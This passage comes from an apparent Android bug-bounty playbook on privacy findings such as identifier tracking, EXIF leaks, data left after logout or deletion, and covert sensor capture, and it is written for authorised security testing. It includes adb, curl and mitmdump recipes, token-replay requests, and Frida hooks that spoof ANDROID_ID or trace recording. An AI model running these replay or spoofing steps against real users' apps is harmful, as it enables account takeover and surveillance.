| **Maps to** | MASWE-0068 (Incorrect Use of Identifiers for User Tracking, CWE-359), MASWE-0067 (Lack of Anonymisation or Pseudonymisation Measures), MASWE-0074 (Inadequate Tracking Domains Declarations); MASVS-PRIVACY-2 — requires *"technical barriers when employing complex 'fingerprint-like' signals… a fingerprint used for fraud detection should be isolated and not repurposed for audience measurement in an analytics SDK"*; MobSF `api_get_advertising`; H1 **#803941** (NordVPN, Low, **$0**) |

- **Test:** The reportable shape is not "the app collects an advertising ID" — that is expected. It is
  (a) the advertising ID transmitted **in the same request** as a persistent identifier or account id, which
  breaks its reset guarantee; (b) the same identifier correlated across two unrelated third-party
  destinations; (c) transmission after the user opted out of ad personalisation; or (d) a fraud-purpose
  fingerprint reused for analytics, which MASVS-PRIVACY-2 calls out by name.
- **How:**
```bash
grep -rnE 'ANDROID_ID|Settings\.Secure\.getString|getAndroidId|AdvertisingIdClient|getAdvertisingIdInfo|isLimitAdTrackingEnabled|AppSetIdClient' out/sources/ -A6
grep -nE 'com\.google\.android\.gms\.permission\.AD_ID' out/AndroidManifest.xml
AID=$(adb shell settings get secure android_id | tr -d '\r')
mitmdump -nr run.mitm -s /dev/stdin <<PY
AID = b'$AID'
def request(f):
    b = (f.request.content or b'') + f.request.pretty_url.encode()
    if AID in b: print('ANDROID_ID ->', f.request.pretty_host, f.request.path[:70])
PY
# opt-out test
adb shell settings put secure limit_ad_tracking 1
```
- **Proof:** One request containing **both** the advertising ID and a persistent identifier (Android ID,
  account id, email hash), or the same ID reaching two distinct third-party destinations, or transmission
  after the opt-out toggle.
- **Escalation:** -> D20-025 (declaration); -> D20-020 (consent). Expect a Low rating unless the programme
  scopes privacy explicitly — H1 #803941 paid $0 — so lead with the linkage, not the collection.
- **Ruled out when:** The advertising ID is sent alone, never joined to a persistent identifier in the same
  payload or across correlated requests, and transmission stops when limit-ad-tracking is set. Attach the
  before/after host and field lists.

### D20-054 · Hardware MAC recovery through `/sys`, native code, or an OEM hook

| | |
|---|---|
| **Severity ceiling** | Medium (High on an OEM build) |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (null) |
| **Attacker** | AM-08; AM-03 on an OEM build |
| **Applies to** | **Android 10+** for default MAC randomisation; **11–13** for the progressive tightening |
| **Maps to** | AOSP security-model paper Table 3 — **11–13** "Restricted access to the hardware MAC address", mitigating [T.D1]; Table 6 — **10** "MAC randomization enabled by default for client mode, SoftAP, and Wi-Fi Direct", mitigating [T.P1][T.N1]; Table 3 — **10** "/proc/net limitations and other side channel mitigations"; §4.3.3 notes the `/proc` and `/sys` restrictions from Android 7/8 were partly motivated by apps abusing them "for side-channel attacks on data not otherwise accessible through their lack of required Android permissions (e.g. network hardware MAC addresses)"; MobSF `api_get_wifi`; MASWE-0068 |

- **Test:** MAC randomisation removed a stable identifier deliberately. An app that recovers the **hardware**
  MAC — through a native path, a `/sys` read, a privileged API or an OEM hook — has re-created it.
- **How:**
```bash
grep -rnE 'getMacAddress\(|NetworkInterface\.getHardwareAddress|/sys/class/net|wlan0|getConnectionInfo\(' out/sources/
for so in out/lib/*/*.so; do strings -n 6 "$so" | grep -aE '/sys/class/net|wlan0|hw_addr' && echo "  ^ $so"; done
adb shell cat /sys/class/net/wlan0/address 2>&1     # expect permission denied from an app context
```
  Compare the transmitted value against the real hardware MAC and against the per-network randomised one.
- **Proof:** The app transmitting a MAC that matches the device's hardware MAC rather than the randomised
  per-network value, shown in a proxy capture with both values side by side.
- **Escalation:** Persistent cross-install tracking; on an OEM engagement it is a platform-restriction bypass
  -> D25.
- **Ruled out when:** No MAC-shaped value leaves the device, or the value transmitted changes when you forget
  and rejoin the network (proving it is the randomised per-network MAC, which is the intended behaviour).

### D20-055 · High-rate motion sensors as an inference channel

| | |
|---|---|
| **Severity ceiling** | High (undisclosed high-resolution motion telemetry is a documented keystroke and speech inference channel) |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (null) |
| **Attacker** | AM-08 |
| **Applies to** | **targetSdk 31+** — Android 12 rate-limits motion sensors "to protect sensitive user information"; `HIGH_SAMPLING_RATE_SENSORS` lifts the limit |
| **Maps to** | developer.android.com `about/versions/12/behavior-changes-12` (motion sensors rate-limited for targetSdk 31+); `develop/background-work/services/fgs/service-types` (`HIGH_SAMPLING_RATE_SENSORS` as a manifest prerequisite for the `health` FGS type); MASTG-TEST-0255 (Permission Requests Not Minimized); MASWE-0073 |

- **Test:** An app holding `HIGH_SAMPLING_RATE_SENSORS` without a stated high-rate use case (fitness tracking,
  a game controller, a medical sensor) is collecting a high-resolution side channel. The finding is the
  permission plus a `SENSOR_DELAY_FASTEST` registration plus the sample stream leaving the device.
- **How:**
```bash
grep -n 'HIGH_SAMPLING_RATE_SENSORS' out/AndroidManifest.xml
grep -rnE 'registerListener\(.*SENSOR_DELAY_(FASTEST|GAME)|SensorManager\.SENSOR_DELAY|TYPE_ACCELEROMETER|TYPE_GYROSCOPE|TYPE_LINEAR_ACCELERATION' out/sources/
mitmdump -nr run.mitm -s /dev/stdin <<'PY'
import re
ARR = re.compile(rb'\[\s*-?\d+\.\d+\s*,\s*-?\d+\.\d+\s*,\s*-?\d+\.\d+')
def request(f):
    b = f.request.content or b''
    if len(ARR.findall(b)) > 20: print('sensor-array payload ->', f.request.pretty_host, len(b))
PY
```
- **Proof:** The permission declared, a `SENSOR_DELAY_FASTEST` registration, and a captured request body
  containing accelerometer/gyroscope arrays — with the Data safety section not declaring it.
- **Escalation:** -> D20-025; -> D03 for the permission-minimisation finding.
- **Ruled out when:** The permission is absent, or present with a registration rate at `SENSOR_DELAY_NORMAL`/
  `SENSOR_DELAY_UI` and a stated feature that uses it, and no sensor arrays leave the device.

### D20-056 · Installed-package enumeration as a fingerprinting surface

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (null) — and see the Graveyard: enumeration *as such* is documented intended behaviour |
| **Attacker** | AM-08 |
| **Applies to** | **LEGACY:** free package visibility is `targetSdk < 30`; from targetSdk 30 `<queries>` or `QUERY_ALL_PACKAGES` is required |
| **Maps to** | Google Mobile VRP Invalid Reports, Intended Behavior: *"the ability of an application to tell which versions of which apps are installed is intended functionality of the Android platform which we do not consider a vulnerability"*; MobSF `api_installed`; MASTG-TEST-0255; MASWE-0068 |

- **Test:** The installed-app list is a high-entropy, stable fingerprint. The finding is not "the app can
  enumerate packages" — Google says that is intended — it is that the app **transmits** the list (or a hash
  of it) to a third party as a tracking signal, while declaring `QUERY_ALL_PACKAGES` with no stated need.
  Note the second use of the same list: it is usually the app's root/Frida/competitor-detection blocklist,
  which belongs to D21.
- **How:**
```bash
grep -nE 'QUERY_ALL_PACKAGES|<queries>' out/AndroidManifest.xml
python3 - <<'PY'
import re
m = open('out/AndroidManifest.xml').read()
q = re.findall(r'<queries>(.*?)</queries>', m, re.S)
print('queries blocks:', len(q))
for b in q: print(b[:400])
PY
grep -rnE 'getInstalledPackages|getInstalledApplications|queryIntentActivities|getPackageInfo\(' out/sources/ -A4
mitmdump -nr run.mitm --set flow_detail=3 2>/dev/null | grep -cE 'com\.[a-z]+\.[a-z]+.*com\.[a-z]+\.[a-z]+'
```
- **Proof:** A captured request containing a list (or a hash-set) of installed package names sent to a
  third-party host, plus `QUERY_ALL_PACKAGES` in the manifest with no feature that needs it.
- **Escalation:** -> D03 (permission justification); -> D21 (the same list is the detection blocklist);
  -> D20-025 (undeclared "Device or other IDs" collection).
- **Ruled out when:** The manifest declares a narrow `<queries>` block matching specific, justified
  interactions, no `QUERY_ALL_PACKAGES`, and no package list leaves the device.

### D20-057 · The identifier that *is* the authentication factor — the one that escapes a privacy rating

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (**P1**) where the identifier alone yields a session |
| **Attacker** | AM-03 (any local app that can read or spoof the identifier) / AM-01 if it is accepted remotely |
| **Applies to** | all; common in legacy device-binding, "trusted device" and silent-login flows |
| **Maps to** | MASWE-0068; MobSF `api_get_device`; QARK `file/phone_identifier.py` — Google's guidance is to *"create UUID instead of using phone identifiers"* |

- **Test:** The inversion that pays. If `ANDROID_ID`, the advertising ID, the serial, a MAC or an
  installation id is used as a **login key, a session key, or the "remember this device" token**, it is not a
  privacy finding at all — it is a spoofable authenticator, because every one of those values is readable or
  settable by code on the device and several are visible to other apps.
- **How:**
```bash
grep -rnE 'ANDROID_ID|AdvertisingIdClient|Build\.SERIAL|getMacAddress|installationId|deviceId' out/sources/ -A8 \
  | grep -inE 'login|auth|session|token|register|bind|trust|deviceLogin|silentLogin'
# then replay the identifier from a second device / a fresh install
curl -s -X POST https://api.target.example/v1/auth/device \
  -H 'Content-Type: application/json' -d '{"device_id":"<victim value>"}' -i
```
```javascript
// spoof it locally and see whether the app authenticates
Java.perform(function () {
  var S = Java.use('android.provider.Settings$Secure');
  S.getString.overload('android.content.ContentResolver','java.lang.String').implementation = function (r, k) {
    if (k === 'android_id') { console.log('[spoof] android_id'); return 'aaaaaaaaaaaaaaaa'; }
    return this.getString(r, k); };
});
```
- **Proof:** A session issued to a request carrying only the identifier, from a device that never
  authenticated — the full request and the returned token, then one authenticated call with it.
- **Escalation:** This is a D13 report, not a D20 one. File it there and cross-reference.
- **Ruled out when:** Identifiers appear only in telemetry payloads and never in an authentication or
  session-establishment request, and a device-id-only call returns 401. Attach the 401.

### D20-058 · EXIF geolocation not stripped — and the only variant with a rated VRT node

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.exif_geolocation_data_not_stripped_from_uploaded_images.automatic_user_enumeration` (**P3**) / `…manual_user_enumeration` (**P4**) — note the qualifier. **Without user enumeration there is no rated node**, and several programmes exclude EXIF by name |
| **Attacker** | **AM-05** — another signed-in user of the same app, fetching a photo the victim uploaded |
| **Applies to** | all apps that accept and re-serve user photos: marketplace listings, dating profiles, review photos, claim evidence, support attachments |
| **Maps to** | Google Mobile VRP: *"Location information alone does not qualify (unless combined with the ability to uniquely identify an individual)"*; Basecamp lists "EXIF information not stripped from uploaded images" as out of scope; HackenProof excludes image metadata "unless they expose sensitive user information"; empirical: X/xAI "Twitter for android is exposing user's location to any installed android app" **$560**; T1430 Location Tracking; MASWE-0067 |

- **Test:** The self-directed finding — "my own photo keeps its GPS" — is discounted everywhere. The payable
  variant is cross-user: the app uploads photos with the GPS block intact **and the backend serves the
  original file to other users**, so any viewer learns where the photo was taken. The "user enumeration"
  qualifier in the VRT node is what you must satisfy: tie the coordinates to an identifiable person.
- **How:**
```bash
grep -rnE 'ExifInterface|TAG_GPS|setAttribute\("GPS|stripExif|removeExif|Bitmap\.compress|MediaStore\.Images' out/sources/
# 1. make a photo with known GPS and upload it as account A
exiftool -GPSLatitude -GPSLongitude -Model -DateTimeOriginal test.jpg
# 2. fetch it as a DIFFERENT account
curl -s "https://cdn.target.example/listings/<id>/original.jpg" -H "Authorization: Bearer $B" -o got.jpg
exiftool -GPSLatitude -GPSLongitude -DateTimeOriginal -Model got.jpg
# 3. and unauthenticated, if the CDN allows it
curl -s "https://cdn.target.example/listings/<id>/original.jpg" -o anon.jpg && exiftool -GPSLatitude anon.jpg
```
- **Proof:** `exiftool` on the file fetched **by a different account** returning the uploader's GPS
  coordinates and device model, plotted to show they resolve to a residence, alongside the profile that
  identifies the uploader. That pairing is the "user enumeration" the VRT node requires.
- **Escalation:** Combine with the user-search oracle in D15 to turn "a listing" into "this named person's
  home". Argue it up where the population is safety-sensitive — dating, gig workers, minors.
- **Ruled out when:** The served file has been re-encoded or its metadata stripped — `exiftool` on the
  fetched original returns no GPS tags — for every image endpoint (listing, avatar, message attachment,
  support upload), tested individually. Different endpoints are often processed by different services;
  check each.

### D20-059 · Photo-picker versus full media grant — metadata for images the user never selected

| | |
|---|---|
| **Severity ceiling** | High (Critical if EXIF GPS for unselected images is shipped) |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (null); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-08 |
| **Applies to** | API 29+ apps with a media-import feature; the photo picker and `READ_MEDIA_VISUAL_USER_SELECTED` are the modern alternative to a full `READ_MEDIA_IMAGES` grant |
| **Maps to** | MASTG-TEST-0254 (Dangerous App Permissions), MASTG-TEST-0255 (Permission Requests Not Minimized); MASWE-0073; T1636.004 Protected User Data: Photos |

- **Test:** An app that asks for the full media permission when the photo picker would do gains read access
  to the whole gallery — and several do enumerate it, sending filenames, timestamps and EXIF for images the
  user never selected. The finding is the enumeration of unselected media, not the permission alone.
- **How:**
```bash
grep -nE 'READ_MEDIA_IMAGES|READ_MEDIA_VIDEO|READ_MEDIA_VISUAL_USER_SELECTED|READ_EXTERNAL_STORAGE|MANAGE_EXTERNAL_STORAGE' out/AndroidManifest.xml
grep -rnE 'ACTION_PICK_IMAGES|PickVisualMedia|MediaStore\.Images\.Media\.(query|EXTERNAL_CONTENT_URI)|ContentResolver\(\)\.query' out/sources/
# plant a canary image the user will NOT select, then open the picker and cancel
adb push canary_zk8v3p1nd6.jpg /sdcard/Pictures/
adb shell am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file:///sdcard/Pictures/canary_zk8v3p1nd6.jpg
mitmdump -nr run.mitm --set flow_detail=3 2>/dev/null | grep -c zk8v3p1nd6
```
- **Proof:** The canary filename (or its EXIF) appearing in an outbound request although it was never
  selected — with the picker flow recorded to show the user selected nothing.
- **Escalation:** -> D20-058 if EXIF GPS accompanies it; -> D03 for the permission-minimisation finding;
  -> D20-025 for the declaration.
- **Ruled out when:** The app uses the photo picker (`ACTION_PICK_IMAGES` / `PickVisualMedia`) or
  `READ_MEDIA_VISUAL_USER_SELECTED`, and the canary never appears in any request across an import flow.

### D20-060 · Data surviving logout and account switch

| | |
|---|---|
| **Severity ceiling** | Medium (High when the surviving artefact is an authenticator) |
| **VRT** | `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (null, CWE-459); `cryptographic_weakness.incomplete_cleanup_of_keying_material` (**P5**, CWE-459); `broken_authentication_and_session_management.failure_to_invalidate_session.on_logout` (**P4**) |
| **Attacker** | **AM-05** — another user of the same device, which the vendor supports for kiosks, POS terminals, ward tablets and family devices ([T.P4]) |
| **Applies to** | all |
| **Maps to** | H1 **#23913** (Twitter iOS — DMs surviving logout in the application-state file); H1 **#377582** (VK, Low 3.0 — cache DB obtainable by a third-party app); hackwithsingh sec-14-25 #54 "recent apps list", #55 "screenshot file residue" |

- **Test:** Log out, then diff. The question is not "is anything left" (something always is) but "is what is
  left either an authenticator or content belonging to the previous user".
- **How:**
```bash
adb shell run-as $PKG ls -laR /data/data/$PKG/ > before.txt
# ... log out ...
adb shell run-as $PKG ls -laR /data/data/$PKG/ > after.txt && diff before.txt after.txt
adb shell run-as $PKG sh -c 'grep -rlEi "zq4h7m2kx9|token|bearer|@|[0-9]{12,19}" . 2>/dev/null' | head -30
adb shell run-as $PKG find . -newermt '-1 day' -type f | wc -l
# server side
curl -i -H "Authorization: Bearer $OLD" https://api.target.example/v1/me
# and the screen artefacts
adb shell ls /data/system_ce/0/snapshots/ 2>/dev/null
```
- **Proof:** Message content, documents, cached PII or a token still present and readable after an explicit
  logout — and, for the token, a 200 from the API with it.
- **Escalation:** -> D13 if the token still authenticates (that is the whole finding, filed there);
  -> D11 for the storage reachability; -> D20-063 for the reinstall direction. On a shared or resold device
  this becomes a real account-takeover story rather than a hygiene note.
- **Ruled out when:** The post-logout diff shows every user-scoped file removed or overwritten, a grep for
  the marker set returns zero across a non-zero file count, the old token returns 401, and the Recents
  snapshot for the package is gone.

### D20-061 · Account deletion that does not actually delete

| | |
|---|---|
| **Severity ceiling** | Medium as a privacy finding (High when deletion leaves a working authenticator) |
| **VRT** | `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (null); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-05 / AM-11 for the device side; the server side is a data-subject-rights failure |
| **Applies to** | all apps offering in-app account deletion — a Play requirement for apps with accounts |
| **Maps to** | VRT `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (CWE-459); MASVS-PRIVACY-4-flavoured data-deletion expectations; riya78 §7 "Analyze any cloud synchronization or backup mechanisms for data exposure" |

- **Test:** Delete the account, then check both ends. Server side: does `GET /me` 404, does the user still
  appear in search, does the profile URL still render, do their messages still show in other users'
  threads, does the data-export job still produce an archive? Device side: what remains in the sandbox and in
  shared storage? Run this against a **throwaway account you own** — deletion is unrecoverable.
- **How:**
```bash
# capture the "before" state for every surface you can reach
for E in /v1/me /v1/orders /v1/messages /v1/cards /v1/sessions /v1/export; do
  curl -s -o "before_$(basename $E).json" -w "%{http_code} $E\n" \
    -H "Authorization: Bearer $A" "https://api.target.example$E"; done
# delete
curl -i -X DELETE https://api.target.example/v1/me -H "Authorization: Bearer $A"
# re-check with the SAME token, then from a SECOND account, then unauthenticated
for E in /v1/me /v1/orders /v1/messages; do
  curl -s -o /dev/null -w "%{http_code} $E (own token)\n" -H "Authorization: Bearer $A" "https://api.target.example$E"; done
curl -s -o /dev/null -w "%{http_code} public profile\n" "https://target.example/u/<deleted-handle>"
curl -s "https://api.target.example/v1/search?q=zq4h7m2kx9" -H "Authorization: Bearer $B" | jq '.'
# device side
adb shell run-as $PKG sh -c 'grep -rlEi "zq4h7m2kx9" . 2>/dev/null'
adb shell ls -laR /sdcard/Android/data/$PKG /sdcard/Download 2>/dev/null
```
- **Proof:** The deleted user's marker still returned by search under a second account, or the public profile
  still rendering, or the cached PII still on the device — with the deletion confirmation screenshotted and
  timestamped first.
- **Escalation:** -> D20-062 for the token/grant half; -> D15 if the export job still produces the archive;
  the regulatory framing is what moves the rating, but you must lead with the captured response, not the
  regulation.
- **Ruled out when:** After deletion the own-token calls return 401, a second account's search returns
  nothing for the marker, the public profile 404s, and the device grep returns zero. Record all four.

### D20-062 · Deletion that does not revoke tokens, push registrations or third-party grants

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.failure_to_invalidate_session.on_logout` (**P4**); where the surviving token still reaches user data, `broken_authentication_and_session_management.authentication_bypass` (**P1**) |
| **Attacker** | AM-05 / whoever holds a previously issued token |
| **Applies to** | all apps offering account deletion |
| **Maps to** | VRT `broken_authentication_and_session_management.failure_to_invalidate_session.*`; no external identifier verified in the corpus for the grant-revocation half |

- **Test:** Deletion usually flips a flag on a row. Enumerate everything that was issued in the account's
  name and test each one after deletion: the access token, the refresh token, the FCM registration token,
  OAuth grants the user made **through** the app to third parties, linked social identities, saved payment
  instruments at the PSP, the support-chat identity, and any share links or invite tokens the account created.
- **How:**
```bash
# capture every credential BEFORE deleting
ACCESS=$A; REFRESH=$(jq -r .refresh_token login.json); FCM=$(adb logcat -d | grep -oE 'token: [A-Za-z0-9:_-]{100,}' | tail -1)
# delete, then:
curl -i -X POST https://api.target.example/v1/auth/refresh -d "{\"refresh_token\":\"$REFRESH\"}" -H 'Content-Type: application/json'
curl -i -H "Authorization: Bearer $ACCESS" https://api.target.example/v1/orders
curl -i "https://target.example/s/<share-token-created-before-deletion>"
# push still deliverable?  (only to your own token, and say so in the report)
```
- **Proof:** A refresh call returning a **new** access token after the account was deleted, or a share link
  created by the deleted account still resolving, or a third-party OAuth grant still listed as active.
- **Escalation:** -> D13. File this as an authentication finding with the deletion as the precondition; it is
  the highest-severity item in the lifecycle group.
- **Ruled out when:** Every captured credential returns 401/invalid_grant after deletion, share links 404,
  and the third-party grant list is empty. Attach the refresh call's `invalid_grant`.

### D20-063 · Uninstall / reinstall residue and Auto Backup restore

| | |
|---|---|
| **Severity ceiling** | High (when a session token survives uninstall — device resale or handover becomes ATO) |
| **VRT** | `mobile_security_misconfiguration.auto_backup_allowed_by_default` (**P5**); the escalation is `broken_authentication_and_session_management.authentication_bypass` (**P1**) via the restored token |
| **Attacker** | AM-11 / AM-05 |
| **Applies to** | all. **`adb backup` is LEGACY** — from Android 12 (API 31) it no longer includes app data unless the app is debuggable, so report through the **Auto Backup / device-transfer** path and `<data-extraction-rules>` (which replaced `fullBackupContent` at API 31), or the report closes as non-reproducible |
| **Maps to** | hackwithsingh sec-14-25 #1 "data recovery after application uninstall", #17 "cloud backup (Google Drive)", #18 "auto-backup mechanism", #19 "device transfer mechanism", #20 "smart switch migration", sec-14-17 #49 "backup data is bound to device identity preventing cross-device restore abuse"; **D11-051 to D11-058 own the backup rig** — reuse it |

- **Test:** Uninstall and reinstall, then see what returns and what was left behind. Two distinct findings:
  data that **returns** (Auto Backup restore of a token, so the app is logged in with no credentials
  entered), and data **left behind** on shared storage that uninstall does not touch.
- **How:**
```bash
adb uninstall $PKG
adb shell ls -laR /sdcard/Android/data/$PKG /sdcard/Android/media/$PKG /sdcard/Download 2>/dev/null
adb install target.apk && adb shell monkey -p $PKG 1
adb shell run-as $PKG ls -la shared_prefs/ databases/ files/
# the modern backup path (see D11 for the full rig)
grep -oE 'allowBackup="[^"]*"|fullBackupContent="[^"]*"|dataExtractionRules="[^"]*"|backupAgent="[^"]*"' out/AndroidManifest.xml
cat out/res/xml/backup_rules.xml out/res/xml/data_extraction_rules.xml 2>/dev/null
adb shell bmgr enabled; adb shell bmgr list transports; adb shell bmgr backupnow $PKG
```
- **Proof:** The app opening straight into an authenticated session after a clean reinstall with no
  credentials entered — record the whole sequence — or PII files still on `/sdcard` after uninstall, read
  from a zero-permission PoC app.
- **Escalation:** -> D11 for the backup mechanics and the restore-write direction; -> D13 for the restored
  token; -> D02 if the build is debuggable and `adb backup` still works.
- **Ruled out when:** `dataExtractionRules` excludes every credential- and PII-bearing path for **both**
  `<cloud-backup>` and `<device-transfer>` (a missing section means that mode is fully enabled), a
  `bmgr backupnow` + restore leaves the app logged out, and nothing remains under `/sdcard` after uninstall.

### D20-064 · Camera or microphone access not tied to a visible user action

| | |
|---|---|
| **Severity ceiling** | Critical (covert recording); High for access that is disclosed but broader than necessary |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (null); the recorded artefact files as `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-08 / the app itself |
| **Applies to** | Background sensor restriction is **Android 9+**; the status-bar indicator and global mic/camera toggles are **Android 12+** |
| **Maps to** | T1429 Audio Capture (ATT&CK: `RECORD_AUDIO` for the mic; `CAPTURE_AUDIO_OUTPUT` for call recording is *"restricted to privileged apps… only privileged applications, such as those distributed by Google or the device vendor, can access audio output"*, with `MediaRecorder.AudioSource.VOICE_CALL` as the call-capture source); T1512 Video Capture (`android.permission.CAMERA`; *"Android 9 and above restricts access to the mic, camera, and other device sensors from applications running in the background"*); T1541 Foreground Persistence; developer.android.com `about/versions/12/behavior-changes-all` (mic/camera toggles and indicators); MASTG-TEST-0254 |

- **Test:** `appops` records a last-access timestamp per operation. Compare that record against your own
  interaction log: any `RECORD_AUDIO` or `CAMERA` access in a window where you performed no
  audio/video-related action is the finding. A concrete abuse worth testing on Android 12+: capture in very
  short bursts, or starting while the screen is off, so the indicator is never meaningfully visible.
- **How:**
```bash
adb shell appops get $PKG | grep -iE 'CAMERA|RECORD_AUDIO|PHONE_CALL_MICROPHONE|time='
adb shell dumpsys media.camera | grep -iB2 -A6 "$PKG"
adb shell dumpsys audio | grep -iB2 -A6 "$PKG|RECORD"
adb logcat -d | grep -iE 'AudioRecord|startRecording|CameraDevice|openCamera'
adb shell cmd sensor_privacy enable microphone     # exercise the Android 12 global toggle
```
```javascript
Java.perform(function () {
  var AR = Java.use('android.media.AudioRecord');
  AR.startRecording.overload().implementation = function () {
    console.log('[AudioRecord.startRecording]\n' +
      Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()));
    return this.startRecording(); };
});
```
- **Proof:** An `appops` access timestamp — or the Frida hook firing — during a window in which you performed
  no related action, correlated with an audio/video artefact appearing in the data directory or an upload in
  the proxy.
- **Escalation:** -> D06 if a foreground service exists purely to keep the sensor alive (D20-066);
  -> D20-025 for the declaration; -> D20-065 if the capture is also concealed.
- **Ruled out when:** Every `appops` access timestamp aligns with a user action you performed, the hook never
  fires while backgrounded, and the global toggle stops capture cleanly. Attach the `appops` timeline next to
  your interaction log.

### D20-065 · Concealment of collection — screen-off, muted device, invisible overlay

| | |
|---|---|
| **Severity ceiling** | High — deliberate concealment is a consent-integrity finding, not only a technical one |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (null) |
| **Attacker** | the app / an SDK inside it (AM-08) |
| **Applies to** | all |
| **Maps to** | T1628.002 User Evasion (ATT&CK: BRATA *"can turn off or fake turning off the screen while performing malicious activities"*; BusyGasper *"hide[s] malicious activity by turning the screen's brightness as low as possible and muting the device"*; Crocodilus S9004 *"has displayed a black screen overlay and has muted the sound of the device to conceal all malicious actions"*; Hornbill *"uses an infrequent data upload schedule to avoid user detection"*); T1628 Hide Artifacts |

- **Test:** Does the app suppress its own UI indications while collecting — a black or transparent overlay, a
  muted stream, a suppressed notification, brightness driven to zero, or activity deliberately timed to idle
  periods? In a legitimate app this usually surfaces as an over-aggressive analytics or session-replay
  feature, so trace it to the SDK before writing it up as malice.
- **How:**
```bash
grep -rnE 'setStreamVolume|ADJUST_MUTE|setAlpha\(0|alpha="0|TYPE_APPLICATION_OVERLAY|setScreenBrightness|FLAG_KEEP_SCREEN_ON|isInteractive|isScreenOn|PowerManager|SensorManager|setVisibility\(View\.INVISIBLE' out/sources/
adb shell dumpsys power | grep -iE 'mWakefulness|Display Power'
adb shell dumpsys window | grep -iE 'TYPE_APPLICATION_OVERLAY|alpha='
```
  Record the screen while `dumpsys` shows the app active and the proxy shows uploads.
- **Proof:** A recording in which the screen appears off or idle while `dumpsys` shows the app running and
  the proxy shows outbound data, with the concealment call site named from the grep.
- **Escalation:** -> D18 (which SDK); -> D04 overlay findings; -> D20-064.
- **Ruled out when:** No brightness, volume, overlay or visibility manipulation occurs outside a user-invoked
  feature (a media player, a torch, a reader mode), and uploads are tied to foreground activity.

### D20-066 · A foreground service held purely to keep sensor or capture access alive

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (null) |
| **Attacker** | the app / an SDK inside it |
| **Applies to** | targetSdk 34+ apps must declare an FGS type; `mediaProjection`, `microphone`, `camera` and `health` are the relevant ones |
| **Maps to** | T1541 Foreground Persistence; developer.android.com `develop/background-work/services/fgs/service-types` (`HIGH_SAMPLING_RATE_SENSORS` as a manifest prerequisite for the `health` FGS type) |

- **Test:** Android 9+ blocks background sensor access, so an app that wants continuous access keeps a
  foreground service alive. The finding is an FGS whose declared type exists only to hold the sensor or
  projection open — a persistent notification the user reads as "syncing" while the real purpose is capture.
  This is exactly ATT&CK's T1541 pattern.
- **How:**
```bash
grep -nE 'foregroundServiceType|FOREGROUND_SERVICE(_[A-Z_]+)?' out/AndroidManifest.xml
grep -rnE 'startForeground\(|ServiceInfo\.FOREGROUND_SERVICE_TYPE_' out/sources/ -A6
adb shell dumpsys activity services $PKG | grep -iE 'foreground|type=|started|isForeground'
# does the sensor stay open across the service's lifetime?
adb shell appops get $PKG | grep -iE 'RECORD_AUDIO|CAMERA|time='
```
- **Proof:** The FGS running with a `microphone` / `camera` / `mediaProjection` type across a window in which
  the user performed no related action, with the `appops` timestamps showing continuous access and the
  notification text describing something else.
- **Escalation:** Report it together with D20-064 — the FGS is the *how* and the sensor access is the *what*.
  -> D06 for the service-side findings, -> D03 for the permission set.
- **Ruled out when:** Every FGS type declared corresponds to a user-visible, user-initiated feature, the
  service stops when that feature ends (`dumpsys activity services` shows it gone), and sensor access stops
  with it.

### D20-067 · Run the pre-severity gate against the Critical claim, not against the leak

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — governance |
| **Attacker** | n/a |
| **Applies to** | every Critical or High claim in this chapter |
| **Maps to** | `triage-validation` PRE-SEVERITY GATE; the 7-Question Gate; the "never write *could potentially*" rule |

- **Test:** Write the draft Critical title first, then substitute the **Critical claim** — not the bug — into
  each question. (1) Have I validated the full chain to attacker-attainable impact, or only one primitive in
  the middle? "Token present in the log" is a primitive; "token in the log, read by package X, replayed
  against the API returning the victim's data" is a chain. (2) What does the attacker walk away with, in one
  concrete sentence? (3) Have I personally reproduced the whole chain end to end **at least twice**?
  (4) Is there still an inheritance, signature, audience or binding check gating it? If yes it is not
  Critical — document it as "primitive present" at a lower severity. (5) Has the programme rejected this
  severity class before? For D20 specifically, question 5 usually answers itself: logging is excluded by
  Google, EXIF by Basecamp, clipboard flattened to P5 by Bugcrowd.
- **How:** Fill the Q1 template before writing a word of the report: `1. Setup: I need [own account / a
  co-resident app with notification access / no account] 2. Request: [the exact adb command, the exact HTTP
  request, copy-paste ready] 3. Result: I can [read/modify] [exact data shown] 4. Impact: [ATO / PII read /
  money] 5. Cost: [X minutes, $0]`. **If you cannot write step 2 as a real command or request, kill the
  finding.** Then apply the writing rule: never "could potentially", "could be used to", or "may allow" —
  either demonstrate the impact end to end, or downgrade the claim to match what you actually showed.
- **Proof:** A documented pass/kill decision per finding, and a severity that matches the demonstrated step.
- **Escalation:** Where the VRT default undersells a demonstrated impact, open the report body with the
  literal heading **"Severity request — please review carefully before applying VRT default"**, name the
  chosen VRT and its default, state the priority you are requesting, and give three grounded impact axes —
  one of which should cite the programme's own focus areas by name. Route within the system; never pick an
  inaccurate VRT node to get a higher default.
- **Ruled out when:** n/a — governance.

### D20-068 · Retraction discipline, and the finding you must **not** retract

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — governance |
| **Attacker** | n/a |
| **Applies to** | every engagement |
| **Maps to** | `triage-validation` RETRACTION DISCIPLINE; `mid-engagement-ir-detection` |

